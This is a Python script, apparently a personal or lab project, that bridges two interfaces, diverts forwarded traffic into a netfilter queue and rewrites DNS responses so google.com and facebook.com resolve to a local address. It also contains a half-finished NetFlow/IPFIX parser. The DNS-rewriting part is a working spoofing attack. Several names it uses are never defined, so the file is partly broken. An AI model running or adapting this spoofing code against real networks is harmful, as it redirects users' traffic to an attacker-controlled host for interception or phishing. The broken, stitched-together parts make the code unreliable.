import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR,TCP
from netfilterqueue import NetfilterQueue
from threading import Thread, Event
from subprocess import PIPE, Popen
from core.V5 import *
from core.V1 import *
from core.V9 import *
import logging,os,sys
from io import BufferedReader
import ipfix 
import ipfix.reader
import ipfix.v9pdu
import ipfix.ie
import netflow
ipfix.ie.use_iana_default()
ipfix.ie.use_5103_default()

class DnsSnoof:
        def __init__(self, hostDict, queueNum):
                self.hostDict = hostDict
                self.queueNum = queueNum
                self.queue = NetfilterQueue()

        def __call__(self):
                #log.info("Snoofing....")
                log.info("Starting .......")
                os.system('iptables -I FORWARD -j NFQUEUE --queue-num %s ' % str(self.queueNum))
                self.configure()
                self.queue.bind(self.queueNum, self.callBack)
                try:
                        self.queue.run()
                except KeyboardInterrupt:
                        os.system('iptables -D FORWARD -j NFQUEUE --queue-num %s' % str(self.queueNum))
                        log.info("[!] iptable rule flushed")
                        self.reconfigure()

        def configure(self):
                """Sets up a bridge.
                """
                ingress_ip, egress_ip       = "192.168.40.40","192.168.50.50"
                ingress_iface, egress_iface = "eth0","eth1"
                bridge_ip           = ingress_ip if(ingress_ip < egress_ip) else egress_ip

                start_cmds = [
                        [
                                'brctl addbr br0',
                                'brctl addif br0 %s %s' %(ingress_iface,egress_iface),
                                'brctl stp br0 yes',
                                'ifconfig %s 0.0.0.0' % (ingress_iface),
                                'ifconfig %s 0.0.0.0' % (egress_iface),
                                'ifconfig br0 %s up' % (bridge_ip),
                        ],[
                                #'iptables -A INPUT -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' %(ingress_iface),
                                #'iptables -A INPUT -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (egress_iface),
                                #'iptables -A FORWARD -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (ingress_iface),
                                #'iptables -A FORWARD -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (egress_iface)
                        ]
                ]

                print('[*] creating a bridge.')

                for cmd in start_cmds[0]:
                        cmd = 'sudo %s' % (cmd)
                        p = Popen(cmd,shell=True,stdin=PIPE,stderr=PIPE,stdout=PIPE)
                        if len(p.stderr.read()) > 0:
                                print('    # %s [ fail ]' % (cmd.ljust(85)))
                        else:
                                print('    # %s [ success ]' % (cmd.ljust(85)))

                #print('\n[*] configuring iptables.')
                #for cmd in start_cmds[1]:
                #        cmd = 'sudo %s' % (cmd)
                #        p = Popen(cmd,shell=True,stdin=PIPE,stderr=PIPE,stdout=PIPE)
                #        if len(p.stderr.read()) > 0:
                #                print('    # %s [ fail ]' % (cmd.ljust(85)))
                #        else:
                #                print('    # %s [ success ]' % (cmd.ljust(85)))

                
                
        def reconfigure(self):
                """Reconfigures the filter.
                """
                ingress_ip, egress_ip       = "192.168.40.40","192.168.50.50"
                ingress_iface, egress_iface = "eth0","eth1"
                bridge_ip           = ingress_ip if(ingress_ip < egress_ip) else egress_ip

                print("\n[*] restoring interface states.")
                exit_cmds = [
                        [
                                'brctl delif br0 %s %s' % (ingress_iface, egress_iface),
                                'ifconfig br0 down',
                                'brctl delbr br0',
                                'ifconfig %s %s up' % (ingress_iface,ingress_ip),
                                'ifconfig %s %s up' % (egress_iface,egress_ip)
                        ],[
                                #'iptables -D INPUT -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (ingress_iface),
                                #'iptables -D INPUT -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (egress_iface),
                                #'iptables -D FORWARD -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (ingress_iface),
                                #'iptables -D FORWARD -m physdev --physdev-in %s -j NFQUEUE --queue-num 1' % (egress_iface)
                        ]
                ]

                for cmd in exit_cmds[0]:
                        cmd = 'sudo %s' % (cmd)
                        p = Popen(cmd,shell=True,stdin=PIPE,stderr=PIPE,stdout=PIPE)
                        if len(p.stderr.read()) > 0:
                                print('    # %s [ fail ]' % (cmd.ljust(85)))
                        else:
                                print('    # %s [ success ]' % (cmd.ljust(85)))

                #print('\n[*] restoring iptables.')
                #for cmd in exit_cmds[1]:
                #        cmd = 'sudo ' + cmd
                #        p = Popen(cmd,shell=True,stdin=PIPE,stderr=PIPE,stdout=PIPE)
                #        if len(p.stderr.read()) > 0:
                #                print('    #  %s [ fail ]' % (cmd.ljust(85)))
                #        else:
                #                print('    # %s [ success ]' % (cmd.ljust(85)))



        def callBack(self, packet):
                scapyPacket = IP(packet.get_payload())
                
                if scapyPacket.haslayer(DNSRR):
                        try:
                                log.info('[original] : %s ' % (scapyPacket[DNSRR].summary()))
                                queryName = scapyPacket[DNSQR].qname
                                if queryName in self.hostDict:
                                        scapyPacket[DNS].an = DNSRR(
                                                rrname=queryName, rdata=self.hostDict[queryName])
                                        scapyPacket[DNS].ancount = 1
                                        del scapyPacket[IP].len
                                        del scapyPacket[IP].chksum
                                        del scapyPacket[UDP].len
                                        del scapyPacket[UDP].chksum
                                        log.info("[modified] : %s" % (scapyPacket[DNSRR].summary()))
                                else:
                                        log.info("[not modified] : %s" % (scapyPacket[DNSRR].rdata))
                        except IndexError as error:
                                log.error(error)
                                self.reconfigure()
                        packet.set_payload(bytes(scapyPacket))
                if scapyPacket.haslayer(TCP):
                        try:
                                log.info('[original] : %s ' % (scapyPacket[TCP].summary()))
                                #queryName = scapyPacket[DNSQR].qname
                                #if queryName in self.hostDict:
                                #        ##scapyPacket[DNS].an = TCP(
                                #        ##        rrname=queryName, rdata=self.hostDict[queryName])
                                #        ##scapyPacket[DNS].ancount = 1
                                #        del scapyPacket[IP].len
                                #        del scapyPacket[IP].chksum
                                #        del scapyPacket[UDP].len
                                #        del scapyPacket[UDP].chksum
                                log.info("[modified] : %s" % (scapyPacket[TCP].summary()))
                                #else:
                                #        log.info("[not modified] : %s" % (scapyPacket[TCP].summary()))
                        except IndexError as error:
                                log.error(error)
                                self.reconfigure()
                        packet.set_payload(bytes(scapyPacket))
                        
                if scapyPacket.haslayer(Raw):
                    data = scapyPacket.getlayer(Raw).load
                    try:
                        netflow_version = struct.unpack('!H', data[:2])[0]
                    except Exception as e:
                        return 
                    version = netflow_version
                    if(netflow_version == 9):
                            print("Netflow version : ",netflow_version)
                            export = ExportV9Packet(data,TEMPLATES)
                            header = export.header
                            version = netflow_version
                            count = header.count
                            TEMPLATES.update(export.templates)
                            # Append new flows
                            flows = [flow.data for flow in export.flows]
                            #recorder.save(flows)
                    elif(netflow_version == 12):
                            print("Netflow version : ",netflow_version)
                            
                    elif(netflow_version == 10):
                            print("Netflow version : ",netflow_version)
                            reader_fn = ipfix.v9pdu
                            reader_fn = ipfix.reader
                            version = netflow_version
                            with BufferedReader(io.BytesIO(data)) as inputstream:
                                reccount = 0
                                host = ip_packet.dst
                                print ("connection from " + str(host))
                                r = ipfix.reader.from_stream(inputstream)
                                
                                for rec in r.namedict_iterator():
                                       print("--- record %u in message %u from %s---" %
                                               (reccount, r.msgcount, str(host)))
                                       reccount += 1
                                       for key in rec:
                                               print("  %30s => %s" % (key, str(rec[key])))
                                TEMPLATES.update(r.msg.templates)
                                for idx in r.msg.active_template_ids():
                                    print(r.msg.template_for_id(idx),"machoooooooooooo khannnnnnnnnnnnnnnn")
                                # Append new flows
                                #flows = [flow.data for flow in r.flows]
                                #self.recorder.save(flows)
                    elif int(version) < 0 or int(version) > 1000:
                                #FlowbasedFilter.onCapture(data)
                                pass 
                        
                        
                    elif(netflow_version == 1):
                            print("Netflow version : ",netflow_version)
                            export = ExportV1Packet(data)
                            header = export.header
                            version = netflow_version
                            count = export.header.count
                            # Append new flows
                            flows = [flow.data for flow in export.flows]
                            #recorder.save(flows)

                    elif(netflow_version == 5):
                            print("Netflow version : ",netflow_version)
                            export = ExportV5Packet(data)
                            header = export.header
                            version = netflow_version
                            count = export.header.count
                            # Append new flows
                            flows = [flow.data for flow in export.flows]
                            #recorder.save(flows)
                    else:
                            
                            print("Netflow Version %s Not Found!" % (netflow_version))
                            pass
                
                return packet.accept()


if __name__ == '__main__':
        try:
                hostDict = {
                        b"google.com.": "192.168.1.100",
                        b"facebook.com.": "192.168.1.100"
                }
                queueNum = 1
                log.basicConfig(format='%(asctime)s - %(message)s',
                                                level = log.INFO)
                snoof = DnsSnoof(hostDict, queueNum)
                snoof()
        except OSError as error:
                log.error(error)
                snoof.reconfigure()

